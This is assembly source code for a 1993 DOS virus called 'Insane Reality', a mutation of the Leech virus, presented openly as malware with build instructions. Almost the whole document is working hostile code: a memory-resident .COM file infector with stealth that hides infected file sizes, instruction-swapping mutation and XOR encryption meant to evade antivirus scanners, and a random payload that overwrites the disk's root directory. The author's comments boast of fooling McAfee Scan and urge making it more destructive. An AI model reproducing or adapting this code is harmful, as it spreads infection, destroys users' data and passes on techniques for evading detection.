; VirusName : Insane Reality              
; Country   : Sweden
; Author    : The Unforiven / Immortal Riot
; Date	    : 22/09/1993          
;
;
; This is a mutation of the Leech virus, and well,
; havn't really changed much in this code, just
; fooled Mcafee's Scan and Dr Alans Toolkit..
;
; Okey, this might not be the very best mutation born,
; but think in this way, if this mutation is so	bad
; then aren't the anti-virus products even worse ?
;
; The original virus was pretty "OK", it is a non-over-
; writing resident .COM.  It will infect the program
; after you have started it. It will not infect renamed
; exe files. (..It looks at the victim's fileheader..)
;
; When the virus is in memory a infected files attributes
; (..size/date/time..) will not be discovored. If you boot
; your computer, and throw the virus out from memory,
; you'll see that the file has been changed. If	an
; infected file is being run again, the virus will
; replace the infected file with its old file-attributes.
;
; This virus was originally written in Bulgaria..
; (..where else..) and I would like to thank the
; scratch coder of this little babe very much... 
;
; Really hope this file will annoy some folks around,
; cuz it certainly annoyed me!..<no more comments>...        
;
; Mcafee's Scan v108 can't find this, and neither can
; S&S Toolkit 6.54. Havn't tried with Tbscan/F-prot,
; but they will probably identify this as the leech virus.
;
; Beware of the Insane Reality we're living in!
; Signed The Unforgiven / Immortal Riot

                .model  tiny
                .code
                org     0

; ÄÄ---Ä-ÄÄÄÄÄ--Ä-ÄÄÄÄÄ--ÄÄÄÄ-Ä-ÄÄÄÄÄÄÄÄÄÄ-ÄÄÄ-ÄÄ-
;   Disassembly by Dark Angel of Phalcon/Skism
;   Assemble with Tasm /m Insane.asm, then link
;   and use exe2bin for make this into a .com..
; Ä-ÄÄÄ-ÄÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄ--ÄÄ-

virlength       =       (readbuffer - leech)
reslength       =       (((encrypted_file - leech + 15) / 16) + 2)

leech:
                jmp     short enter_leech

filesize        dw      offset carrier
oldint21        dw      0, 0
oldint13        dw      0, 0
oldint24        dw      0, 0
datestore       dw      0
timestore       dw      0
runningflag     db      1
evenodd         dw      0

enter_leech:
                call    next
next:
                pop     si
	       	db	0                       ; Scan-fooler..

mutatearea1:
                cli				; prevent all interupts
                push    ds                      ; Why?
                pop     es
                mov     bp,sp                   ; save sp
                mov     sp,si                   ; sp = offset next
                add     sp,encrypt_value1 - 1 - next
mutatearea2:
                mov     cx,ss                   ; save ss
                mov     ax,cs
                mov     ss,ax                   ; ss = PSP
                pop     bx                      ; get encryption value
                dec     sp
                dec     sp
                add     si,startencrypt - next
                nop
decrypt:
mutatearea3:
                pop     ax
                xor     al,bh              ; decrypt away!
                push    ax
                dec     sp
                cmp     sp,si
                jae     decrypt
startencrypt:
                mov     ax,es
                dec     ax
                mov     ds,ax              ; ds->MCB
                db      81h,6,3,0          ;add word ptr ds:[3],-reslength
                dw      0 - reslength
                mov     bx,ds:[3]          ; bx = memory size
                mov     byte ptr ds:[0],'Z' ; mark end of chain
                inc     ax                 ; ax->PSP
                inc     bx
                add     bx,ax              ; bx->high area
                mov     es,bx              ; as does es
                mov     ss,cx              ; restore ss
                add     si,leech - startencrypt
                mov     bx,ds              ; save MCB segment
                mov     ds,ax
                mov     sp,bp              ; restore sp
                push    si
                xor     di,di
                mov     cx,virlength       ; 1024 bytes
                cld
                rep     movsb
                pop     si
                push    bx
                mov     bx,offset highentry
                push    es
                push    bx
                retf                         ; jmp to highentry in
                                             ; high memory
highentry:
                mov     es,ax                ; es->PSP
                mov     ax,cs:filesize
                add     ax,100h              ; find stored area
                mov     di,si
                mov     si,ax
                mov     cx,virlength
                rep     movsb                ; and restore over virus code
                pop     es                   ; MCB
                xor     ax,ax
                mov     ds,ax                ; ds -> interrupt table
                sti
                cmp     word ptr ds:21h*4,offset int21 ; already resident?
                jne     go_resident
                db      26h,81h,2eh,3,0      ;sub word ptr es:[3],-reslength
                dw      0 - reslength        ;alter memory size
                test    byte ptr ds:[46Ch],0E7h ;1.17% chance of activation
                jnz     exit_virus
                push    cs
                pop     ds
                mov     si,offset message	; "Insane Reality.."
display_loop:                                   ; display ASCIIZ string
                lodsb                           ; get next character
                or      al,0                    ; exit if 0
                jz      exit_display_loop
                mov     ah,0Eh                  ; otherwise write character
                int     10h

                jmp     short display_loop
exit_display_loop:
                mov     ah,32h                  ; Get DPB -> DS:BX
                xor     dl,dl
                int     21h
                jc      exit_virus              ; exit on error

                call    getint13and24
                call    setint13and24
                mov     dx,[bx+10h]             ; first sector of root
                                                ; directory
                                                ; BUG: won't work in DOS 4+
                mov     ah,19h                  ; default drive -> al
                int     21h

                mov     cx,2                    ; Overwrite root directory
                int     26h			; Direct write..

                pop     bx
                call    setint13and24           ; restore int handlers
exit_virus:
                jmp     returnCOM
go_resident:
                db      26h, 81h, 6, 12h, 0 ;add word ptr es:12h,-reslength
                dw      0 - reslength       ;alter top of memory in PSP
                mov     bx,ds:46Ch          ;BX = random #
                push    ds
                push    cs
                pop     ds
                push    cs
                pop     es
                mov     runningflag,1       ; reset flag
                and     bh,80h
                mov     nothing1,bh
mutate1:
                test    bl,1
                jnz     mutate2
                mov     si,offset mutatearea1
                add     si,evenodd
                lodsb
                xchg    al,[si]             ; swap instructions
                mov     [si-1],al
mutate2:
                test    bl,2
                jnz     mutate3
                mov     si,offset mutatearea2
                add     si,evenodd
                lodsw
                xchg    ax,[si]             ; swap instructions
                mov     [si-2],ax
mutate3:
                test    bl,4
                jnz     mutate4
                mov     si,offset mutatearea3
                mov     al,2
                xor     [si],al             ; flip between ax & dx
                xor     [si+2],al
                xor     [si+3],al
mutate4:
                test    bl,8
                jnz     findint21
                mov     si,offset next
                mov     di,offset readbuffer
                mov     cx,offset enter_leech
                push    si
                push    di
                lodsb
                cmp     al,5Eh                  ; 1 byte pop si?
                je      now_single_byte_encode
                inc     si                      ; skip second byte of two
                                                ; byte encoding of pop si
now_single_byte_encode:
                push    cx
                rep     movsb
                pop     cx
                pop     si
                pop     di
                cmp     al,5Eh                  ; 1 byte pop si?
                je      encode_two_bytes        ; then change to 2
                mov     al,5Eh                  ; encode a pop si
                stosb
                rep     movsb                   ; then copy decrypt over
                mov     al,90h                  ; plus a nop to keep virus
                stosb                           ; length constant
                xor     ax,ax                   ; clear the flag
                jmp     short set_evenodd_flag
encode_two_bytes:
                mov     ax,0C68Fh             ; encode a two byte form of
                stosw                         ; pop si
                rep     movsb
                mov     ax,1                  ; set evenodd flag
set_evenodd_flag:
                mov     cs:evenodd,ax
findint21:
                mov     ah,30h                ; Get DOS version
                int     21h

                cmp     ax,1E03h              ; DOS 3.30?
                jne     notDOS33

                mov     ah,34h                ; Get DOS critical error ptr
                int     21h

                mov     bx,1460h              ; int 21h starts here
                jmp     short alterint21
notDOS33:
                mov     ax,3521h         ;just get current int 21 handler
                int     21h
alterint21:
                mov     oldint21,bx
                mov     word ptr ds:oldint21+2,es
                mov     si,21h*4                ; save old int 21 handler
                pop     ds                      ; found in interrupt table
                push    si
                push    cs
                pop     es
                mov     di,offset topint21
                movsw
                movsw
                pop     di                      ; and put new one in
                push    ds
                pop     es
                mov     ax,offset int21
                stosw
                mov     ax,cs
                stosw

                mov     di,offset startencrypt
                mov     al,cs:encrypt_value1    ; decrypt original
decryptcode:					; program code
                xor     cs:[di],al
                inc     di
                cmp     di,offset decryptcode
                jb      decryptcode
returnCOM:
                mov     ah,62h                  ; Get current PSP
                int     21h

                push    bx                      ; restore segment registers
                mov     ds,bx
                mov     es,bx
                mov     ax,100h
                push    ax
                retf                            ; Return to PSP:100h

infect:
                push    si
                push    ds
                push    es
                push    di
                cld
                push    cs
                pop     ds
                xor     dx,dx                   ; go to start of file
                call    movefilepointer
                mov     dx,offset readbuffer    ; and read 3 bytes
                mov     ah,3Fh
                mov     cx,3
                call    callint21
                jc      exiterror

                xor     di,di
                mov     ax,readbuffer
                mov     cx,word ptr ds:[0]
                cmp     cx,ax                   ; check if already infected
                je      go_exitinfect
                cmp     al,0EBh                 ; jmp short?
                jne     checkifJMP
                mov     al,ah
                xor     ah,ah
                add     ax,2
                mov     di,ax                   ; di = jmp location
checkifJMP:
                cmp     al,0E9h                 ; jmp?
                jne     checkifEXE              ; nope
                mov     ax,word ptr readbuffer+1
                add     ax,3
                mov     di,ax                   ; di = jmp location
                xor     ax,ax
checkifEXE:
                cmp     ax,'MZ'
                je      exiterror
                cmp     ax,'ZM'
                jne     continue_infect
exiterror:
                stc
go_exitinfect:
                jmp     short exitinfect
                nop
continue_infect:
                mov     dx,di
                push    cx
                call    movefilepointer         ; go to jmp location
                mov     dx,virlength            ; and read 1024 more bytes
                mov     ah,3Fh
                mov     cx,dx
                call    callint21
                pop     cx
                jc      exiterror
                cmp     readbuffer,cx
                je      go_exitinfect
                mov     ax,di
                sub     ah,0FCh
                cmp     ax,filesize
                jae     exiterror
                mov     dx,filesize
                call    movefilepointer
                mov     dx,virlength            ; write virus to middle
                mov     cx,dx                   ; of file
                mov     ah,40h
                call    callint21
                jc      exitinfect
                mov     dx,di
                call    movefilepointer
                push    cs
                pop     es
                mov     di,offset readbuffer
                push    di
                push    di
                xor     si,si
                mov     cx,di
                rep     movsb
                mov     si,offset encrypt_value2
                mov     al,encrypted_file
encryptfile:                                  ; encrypt infected file
                xor     [si],al
                inc     si
                cmp     si,7FFh
                jb      encryptfile
                pop     cx
                pop     dx
                mov     ah,40h                ; and write it to end of file
                call    callint21
exitinfect:
                pop     di
                pop     es
                pop     ds
                pop     si
                retn

int21:
                cmp     ax,4B00h                ; Execute?
                je      execute
                cmp     ah,3Eh                  ; Close?
                je      handleclose
                cmp     ah,11h                  ; Find first?
                je      findfirstnext
                cmp     ah,12h                  ; Find next?
                je      findfirstnext
exitint21:
                db      0EAh                    ; jmp far ptr
topint21        dw      0, 0

findfirstnext:
                push    si
                mov     si,offset topint21
                pushf
                call    dword ptr cs:[si]       ; call int 21 handler
                pop     si
                push    ax
                push    bx
                push    es
                mov     ah,2Fh                  ; Get DTA
                call    callint21
                cmp     byte ptr es:[bx],0FFh   ; extended FCB?
                jne     noextendedFCB
                add     bx,7                    ; convert to normal
noextendedFCB:
                mov     ax,es:[bx+17h]          ; Get time
                and     ax,1Fh                  ; and check infection stamp
                cmp     ax,1Eh
                jne     exitfindfirstnext
                mov     ax,es:[bx+1Dh]
                cmp     ax,virlength * 2 + 1    ; too small for infection?
                jb      exitfindfirstnext       ; then not infected
                sub     ax,virlength            ; alter file size
                mov     es:[bx+1Dh],ax
exitfindfirstnext:
                pop     es
                pop     bx
                pop     ax
                iret

int24:
                mov     al,3
                iret

callint21:
                pushf
                call    dword ptr cs:oldint21
                retn

movefilepointer:
                xor     cx,cx
                mov     ax,4200h
                call    callint21
                retn

execute:
                push    ax
                push    bx
                mov     cs:runningflag,0
                mov     ax,3D00h                ; open file read/only
                call    callint21
                mov     bx,ax
                mov     ah,3Eh                  ; close file
                int     21h                     ; to trigger infection

                pop     bx
                pop     ax
go_exitint21:
                jmp     short exitint21

handleclose:
                or      cs:runningflag,0        ; virus currently active?
                jnz     go_exitint21
                push    cx
                push    dx
                push    di
                push    es
                push    ax
                push    bx
                call    getint13and24
                call    setint13and24
; convert handle to filename
                mov     ax,1220h                ; get job file table entry
                int     2Fh
                jc      handleclose_noinfect    ; exit on error

                mov     ax,1216h                ; get address of SFT
                mov     bl,es:[di]
                xor     bh,bh
                int     2Fh                     ; es:di->file entry in SFT

                mov     ax,es:[di+11h]
                mov     cs:filesize,ax          ; save file size,
                mov     ax,es:[di+0Dh]
                and     al,0F8h
                mov     cs:timestore,ax         ; time,
                mov     ax,es:[di+0Fh]
                mov     cs:datestore,ax         ; and date
                cmp     word ptr es:[di+29h],'MO' ; check for COM extension
                jne     handleclose_noinfect
                cmp     byte ptr es:[di+28h],'C'
                jne     handleclose_noinfect
                cmp     cs:filesize,0FA00h      ; make sure not too large
                jae     handleclose_noinfect
                mov     al,20h                  ; alter file attribute
                xchg    al,es:[di+4]
                mov     ah,2                    ; alter open mode to
                xchg    ah,es:[di+2]	        ; read/write
                pop     bx
                push    bx
                push    ax
                call    infect
                pop     ax
                mov     es:[di+4],al            ; restore file attribute
                mov     es:[di+2],ah            ; and open mode
                mov     cx,cs:timestore
                jc      infection_not_successful
                or      cl,1Fh                  ; make file infected in
                and     cl,0FEh                 ; seconds field
infection_not_successful:
                mov     dx,cs:datestore         ; restore file time/date
                mov     ax,5701h
                call    callint21
handleclose_noinfect:
                pop     bx
                pop     ax
                pop     es
                pop     di
                pop     dx
                pop     cx
                call    callint21
                call    setint13and24
                retf    2                       ; exit with flags intact

getint13and24:
                mov     ah,13h                  ; Get BIOS int 13h handler
                int     2Fh
                mov     cs:oldint13,bx
                mov     cs:oldint13+2,es

                int     2Fh                     ; Restore it

                mov     cs:oldint24,offset int24
                mov     cs:oldint24+2,cs
                retn

setint13and24:
                push    ax
                push    si
                push    ds
                pushf
                cli
                cld
                xor     ax,ax
                mov     ds,ax                ; ds->interrupt table

                mov     si,13h*4
                lodsw
                xchg    ax,cs:oldint13       ; replace old int 13 handler
                mov     [si-2],ax            ; with original BIOS handler
                lodsw
                xchg    ax,cs:oldint13+2
                mov     [si-2],ax

                mov     si,24h*4             ; replace old int 24 handler
                lodsw                        ; with our own handler
                xchg    ax,cs:oldint24
                mov     [si-2],ax
                lodsw
                xchg    ax,cs:oldint24+2
                mov     [si-2],ax
                popf
                pop     ds
                pop     si
                pop     ax
                retn

;ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; Okey..don't change the text to much here, cuz	the virus will refuse
; to work correctly if you writes to many chars..If you wanna modify
; this virus, make it a bit more destructive than it already is. I
; love destructive codes..It reminds me of my Brain..(??) <grin>..
;ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-

message         db      'Insane Reality..  ', 0	   ; Mutation name..
                db      'The Unforgiven / IR..  '  ; That's me..

                db      0, 0, 0, 0, 0

encrypt_value1  db      0
readbuffer      dw      0
                db      253 dup (0)

nothing1        db      0
                db      152 dup (0)
encrypt_value2  db      0
                db      614 dup (0)
encrypted_file  db      0
                db      1280 dup (0)
carrier:
                dw      20CDh

                end     leech

; Greetings goes out to Raver, Metal Militia, Scavenger,
; and all the others livi'n in the Insane Reality of today.